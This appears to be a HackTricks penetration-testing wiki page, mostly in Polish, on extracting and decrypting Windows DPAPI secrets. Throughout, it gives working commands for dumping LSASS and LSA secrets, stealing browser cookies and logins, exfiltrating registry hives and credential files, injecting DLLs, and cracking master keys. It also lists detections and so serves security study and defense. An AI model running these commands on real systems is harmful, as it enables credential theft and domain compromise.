# DPAPI - Ekstrakcja haseł

{{#include ../../banners/hacktricks-training.md}}



## Co to jest DPAPI

Data Protection API (DPAPI) jest wykorzystywane głównie w systemie Windows do **szyfrowania symetrycznego kluczy prywatnych asymetrycznych**, używając jako istotnego źródła entropii sekretów użytkownika lub systemu. Podejście to upraszcza szyfrowanie dla programistów, umożliwiając im szyfrowanie danych przy użyciu klucza pochodzącego z sekretów logowania użytkownika lub, w przypadku szyfrowania systemowego, sekretów uwierzytelniania domeny systemu, dzięki czemu programiści nie muszą samodzielnie zarządzać ochroną klucza szyfrującego.

Najczęstszym sposobem użycia DPAPI są funkcje **`CryptProtectData` i `CryptUnprotectData`**, które pozwalają aplikacjom bezpiecznie szyfrować i odszyfrowywać dane w kontekście sesji procesu, który jest aktualnie zalogowany. Oznacza to, że zaszyfrowane dane mogą zostać odszyfrowane tylko przez tego samego użytkownika lub system, który je zaszyfrował.

Ponadto te funkcje akceptują również parametr **`entropy`**, który jest używany podczas szyfrowania i odszyfrowywania, dlatego aby odszyfrować coś zaszyfrowanego z użyciem tego parametru, musisz podać tę samą wartość entropii, która została użyta przy szyfrowaniu.

### Generowanie klucza użytkownika

DPAPI generuje unikalny klucz (zwany **`pre-key`**) dla każdego użytkownika na podstawie jego poświadczeń. Klucz ten jest wyprowadzany z hasła użytkownika i innych czynników, a algorytm zależy od typu użytkownika, ale kończy się jako SHA1. Na przykład dla użytkowników domenowych, **zależy od NTLM hash użytkownika**.

Jest to szczególnie interesujące, ponieważ jeśli atakujący może uzyskać hash hasła użytkownika, może:

- **Odszyfrować dowolne dane zaszyfrowane za pomocą DPAPI** przy użyciu klucza tego użytkownika bez konieczności kontaktowania się z żadnym API
- Spróbować **złamać hasło** offline, generując prawidłowy klucz DPAPI

Co więcej, za każdym razem gdy użytkownik szyfruje jakieś dane za pomocą DPAPI, generowany jest nowy **master key**. Ten master key jest faktycznie używany do szyfrowania danych. Każdemu master key przypisany jest **GUID** (Globally Unique Identifier), który go identyfikuje.

Master key są przechowywane w katalogu **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, gdzie `{SID}` to Security Identifier tego użytkownika. Master key jest przechowywany zaszyfrowany przez użytkownika **`pre-key`** oraz także przez **domain backup key** do celów odzyskiwania (tak więc ten sam klucz jest przechowywany zaszyfrowany dwukrotnie, przy użyciu dwóch różnych kluczy).

Zauważ, że **klucz domenowy używany do zaszyfrowania master key znajduje się na kontrolerach domeny i nigdy się nie zmienia**, więc jeśli atakujący ma dostęp do kontrolera domeny, może odzyskać domain backup key i odszyfrować master key wszystkich użytkowników w domenie.

Zaszyfrowane bloby zawierają **GUID master key**, który został użyty do zaszyfrowania danych, wewnątrz swoich nagłówków.

> [!TIP]
> Zaszyfrowane bloby DPAPI zaczynają się od **`01 00 00 00`**

Znajdź klucze główne:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Generowanie klucza maszyny/systemu

Jest to klucz używany przez maszynę do szyfrowania danych. Jest oparty na **DPAPI_SYSTEM LSA secret**, który jest specjalnym kluczem, do którego dostęp ma tylko użytkownik SYSTEM. Ten klucz służy do szyfrowania danych, które muszą być dostępne dla samego systemu, takich jak poświadczenia na poziomie maszyny lub sekrety ogólnosystemowe.

Zauważ, że te klucze **nie mają kopii zapasowej domeny**, więc są dostępne tylko lokalnie:

- **Mimikatz** może uzyskać do niego dostęp, zrzucając LSA secrets używając polecenia: `mimikatz lsadump::secrets`
- Sekret jest przechowywany w rejestrze, więc administrator mógłby **zmodyfikować uprawnienia DACL, aby uzyskać do niego dostęp**. Ścieżka w rejestrze to: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Ekstrakcja offline z registry hives jest również możliwa. Na przykład, jako administrator na celu, zapisz hives i wyeksfiltruj je:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Następnie na swojej maszynie analitycznej odzyskaj DPAPI_SYSTEM LSA secret z hives i użyj go do odszyfrowania machine-scope blobs (scheduled task passwords, service credentials, Wi‑Fi profiles, itp.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Protected Data by DPAPI

Among the personal data protected by DPAPI are:

- Windows creds
- Internet Explorer and Google Chrome's passwords and auto-completion data
- E-mail and internal FTP account passwords for applications like Outlook and Windows Mail
- Passwords for shared folders, resources, wireless networks, and Windows Vault, including encryption keys
- Passwords for remote desktop connections, .NET Passport, and private keys for various encryption and authentication purposes
- Network passwords managed by Credential Manager and personal data in applications using CryptProtectData, such as Skype, MSN messenger, and more
- Encrypted blobs inside the register
- ...

System protected data includes:
- Wifi passwords
- Scheduled task passwords
- ...

### Master key extraction options

- If the user has domain admin privileges, they can access the **domain backup key** to decrypt all user master keys in the domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Mając lokalne uprawnienia administratora, możliwe jest **access the LSASS memory** w celu wyodrębnienia kluczy głównych DPAPI wszystkich podłączonych użytkowników oraz klucza SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Jeśli użytkownik ma lokalne uprawnienia administratora, może uzyskać dostęp do **DPAPI_SYSTEM LSA secret**, aby odszyfrować klucze główne maszyny:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Jeśli znane jest hasło lub hash NTLM użytkownika, możesz **odszyfrować klucze główne użytkownika bezpośrednio**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Jeśli jesteś w sesji jako użytkownik, możesz poprosić DC o **backup key to decrypt the master keys using RPC**. Jeśli jesteś local admin i użytkownik jest zalogowany, możesz w tym celu **steal his session token**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Wyświetl Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Dostęp do zaszyfrowanych danych DPAPI

### Znajdź zaszyfrowane dane DPAPI

Typowe **pliki chronione** użytkowników znajdują się w:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Sprawdź również zamianę `\Roaming\` na `\Local\` w powyższych ścieżkach.

Przykłady enumeracji:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) może znaleźć zaszyfrowane DPAPI bloby w systemie plików, rejestrze i blobach B64:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Zwróć uwagę, że [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (z tego samego repo) może być użyty do odszyfrowania przy użyciu DPAPI wrażliwych danych, takich jak cookies.

#### Chromium/Edge/Electron - szybkie przepisy (SharpChrome)

- Bieżący użytkownik — interaktywne odszyfrowanie zapisanych logins/cookies (działa nawet z Chrome 127+ app-bound cookies, ponieważ dodatkowy klucz jest pobierany z Credential Manager użytkownika podczas uruchomienia w user context):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Analiza offline, gdy masz tylko pliki. Najpierw wyodrębnij AES state key z profilu "Local State", a następnie użyj go do odszyfrowania cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Triage obejmujące całą domenę/zdalne, gdy masz DPAPI domain backup key (PVK) i admina na hoście docelowym:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Jeśli masz DPAPI prekey/credkey użytkownika (z LSASS), możesz pominąć password cracking i bezpośrednio decryptować dane profilu:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Uwagi

- Nowsze wersje Chrome/Edge mogą przechowywać niektóre cookies przy użyciu szyfrowania "App-Bound". Rozszyfrowanie offline tych konkretnych cookies nie jest możliwe bez dodatkowego app-bound key; uruchom SharpChrome w kontekście docelowego użytkownika, aby pobrać go automatycznie. Zobacz wspomniany poniżej wpis na blogu bezpieczeństwa Chrome.

### Klucze dostępu i dane

- **Use SharpDPAPI** aby uzyskać poświadczenia z plików zaszyfrowanych przez DPAPI z bieżącej sesji:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Pobierz informacje o credentials** takie jak zaszyfrowane dane i guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Dostęp do masterkeys**:

Odszyfruj masterkey użytkownika, który żąda **domain backup key**, używając RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Narzędzie **SharpDPAPI** obsługuje również te argumenty do odszyfrowywania masterkey (zauważ, że można użyć `/rpc`, aby uzyskać klucz kopii zapasowej domeny, `/password`, aby użyć hasła w postaci jawnej, lub `/pvk`, aby wskazać plik prywatnego klucza DPAPI domeny...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Odszyfruj dane przy użyciu masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Narzędzie **SharpDPAPI** obsługuje również te argumenty do odszyfrowywania `credentials|vaults|rdg|keepass|triage|blob|ps` (zwróć uwagę, że można użyć `/rpc`, aby uzyskać klucz kopii zapasowej domeny, `/password`, aby użyć hasła w postaci jawnej, `/pvk`, aby wskazać plik prywatnego klucza domeny DPAPI, `/unprotect`, aby użyć bieżącej sesji użytkownika...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Używanie DPAPI prekey/credkey bezpośrednio (bez potrzeby hasła)

Jeśli możesz zrzucić LSASS, Mimikatz często ujawnia per-logon DPAPI key, który można użyć do odszyfrowania masterkeys użytkownika bez znajomości plaintext password. Przekaż tę wartość bezpośrednio do narzędzia:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Odszyfruj dane przy użyciu **bieżącej sesji użytkownika**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Odszyfrowanie offline z użyciem Impacket dpapi.py

Jeśli masz SID użytkownika ofiary oraz hasło (lub NT hash), możesz odszyfrować DPAPI masterkeys i Credential Manager blobs całkowicie offline za pomocą Impacket’s dpapi.py.

- Zidentyfikuj artefakty na dysku:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Pasujący masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Jeśli narzędzia do transferu plików są zawodne, zakoduj pliki base64 na hoście i skopiuj wynik:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Odszyfruj masterkey za pomocą SID użytkownika i hasła/hash:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Użyj odszyfrowanego masterkey, aby odszyfrować credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
This workflow often recovers domain credentials saved by apps using the Windows Credential Manager, including administrative accounts (e.g., `*_adm`).

---

### Obsługa opcjonalnej entropii ("Third-party entropy")

Niektóre aplikacje przekazują dodatkową wartość **entropii** do `CryptProtectData`. Bez tej wartości blob nie może zostać odszyfrowany, nawet jeśli znany jest poprawny masterkey. Uzyskanie entropii jest więc niezbędne przy celowaniu w poświadczenia chronione w ten sposób (np. Microsoft Outlook, niektóre VPN clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) is a user-mode DLL that hooks the DPAPI functions inside the target process and transparently records any optional entropy that is supplied. Running EntropyCapture in **DLL-injection** mode against processes like `outlook.exe` or `vpnclient.exe` will output a file mapping each entropy buffer to the calling process and blob. The captured entropy can later be supplied to **SharpDPAPI** (`/entropy:`) or **Mimikatz** (`/entropy:<file>`) in order to decrypt the data.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft wprowadził format masterkey **context 3** począwszy od Windows 10 v1607 (2016). `hashcat` v6.2.6 (grudzień 2023) dodał hash-modes **22100** (DPAPI masterkey v1 context), **22101** (context 1) i **22102** (context 3), co pozwala na przyspieszone przez GPU łamanie haseł użytkowników bezpośrednio z pliku masterkey. W związku z tym atakujący mogą przeprowadzać ataki typu word-list lub brute-force bez potrzeby interakcji z systemem docelowym.

`DPAPISnoop` (2024) automatyzuje ten proces:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Narzędzie potrafi także parsować Credential i Vault blobs, odszyfrowywać je za pomocą cracked keys oraz eksportować cleartext passwords.


### Dostęp do danych innej maszyny

W **SharpDPAPI and SharpChrome** możesz użyć opcji **`/server:HOST`** aby uzyskać dostęp do danych zdalnej maszyny. Oczywiście musisz mieć dostęp do tej maszyny, a w poniższym przykładzie zakłada się, że **domain backup encryption key is known**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Inne narzędzia

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) to narzędzie, które automatyzuje wyciąganie wszystkich użytkowników i komputerów z katalogu LDAP oraz wydobycie domain controller backup key przez RPC. Skrypt następnie rozwiąże wszystkie adresy IP komputerów i wykona smbclient na wszystkich maszynach, żeby pobrać wszystkie DPAPI blobs wszystkich użytkowników i odszyfrować wszystko za pomocą domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Dzięki liście komputerów wyciągniętej z LDAP możesz znaleźć wszystkie podsieci, nawet jeśli ich wcześniej nie znałeś!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) potrafi automatycznie zrzucać sekrety chronione przez DPAPI. Wydanie 2.x wprowadziło:

* Równoległe zbieranie blobów z setek hostów
* Parsowanie **context 3** masterkeys i automatyczna integracja z łamaniem za pomocą Hashcat
* Wsparcie dla szyfrowanych ciasteczek Chrome "App-Bound" (patrz następna sekcja)
* Nowy tryb **`--snapshot`** do wielokrotnego odpytywania endpointów i porównywania (diff) nowo utworzonych blobów

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) to parser w C# dla plików masterkey/credential/vault, który może wypisywać formaty Hashcat/JtR i opcjonalnie automatycznie uruchamiać łamanie. W pełni wspiera formaty masterkey dla maszyny i użytkownika aż do Windows 11 24H1.


## Typowe wykrycia

- Dostęp do plików w `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` i innych katalogach związanych z DPAPI.
- Szczególnie z udziału sieciowego takiego jak **C$** lub **ADMIN$**.
- Użycie **Mimikatz**, **SharpDPAPI** lub podobnych narzędzi do dostępu do pamięci LSASS lub zrzutu masterkeys.
- Zdarzenie **4662**: *An operation was performed on an object* – może korelować z dostępem do obiektu **`BCKUPKEY`**.
- Zdarzenia **4673/4674** gdy proces żąda *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### 2023-2025 vulnerabilities & ecosystem changes

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Atakujący z dostępem do sieci mógł oszukać członka domeny, aby pobrał złośliwy DPAPI backup key, co pozwalało na odszyfrowanie user masterkeys. Załatano w listopadowej aktualizacji kumulatywnej 2023 – administratorzy powinni upewnić się, że DCs i stacje robocze są w pełni zaktualizowane.
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) zastąpiło starszą ochronę opartą wyłącznie na DPAPI dodatkowym kluczem przechowywanym w **Credential Manager** użytkownika. Odszyfrowanie ciasteczek offline wymaga teraz zarówno DPAPI masterkey, jak i **GCM-wrapped app-bound key**. SharpChrome v2.3 i DonPAPI 2.x są w stanie odzyskać dodatkowy klucz przy uruchomieniu w kontekście użytkownika.


### Studium przypadku: Zscaler Client Connector – niestandardowa entropia wyprowadzona z SID

Zscaler Client Connector przechowuje kilka plików konfiguracyjnych w `C:\ProgramData\Zscaler` (np. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Każdy plik jest szyfrowany za pomocą **DPAPI (Machine scope)**, ale vendor dostarcza **custom entropy**, która jest *obliczana w czasie działania* zamiast być przechowywana na dysku.

Entropia jest rekonstruowana z dwóch elementów:

1. Twardo zakodowany sekret osadzony w `ZSACredentialProvider.dll`.
2. The **SID** konta Windows, do którego należy konfiguracja.

Algorytm zaimplementowany przez DLL jest równoważny:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Ponieważ sekret jest osadzony w DLL, który można odczytać z dysku, **każdy lokalny atakujący z uprawnieniami SYSTEM może odtworzyć entropię dla dowolnego SID** i odszyfrować blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Deszyfrowanie daje pełną konfigurację JSON, w tym każdy **device posture check** i jego oczekiwaną wartość – informacje niezwykle cenne przy próbach obejść po stronie klienta.

> Wskazówka: pozostałe zaszyfrowane artefakty (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) są chronione przy użyciu DPAPI **bez** entropii (`16` bajtów o wartości zero). Mogą być zatem odszyfrowane bezpośrednio za pomocą `ProtectedData.Unprotect` po uzyskaniu uprawnień SYSTEM.

## Źródła

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
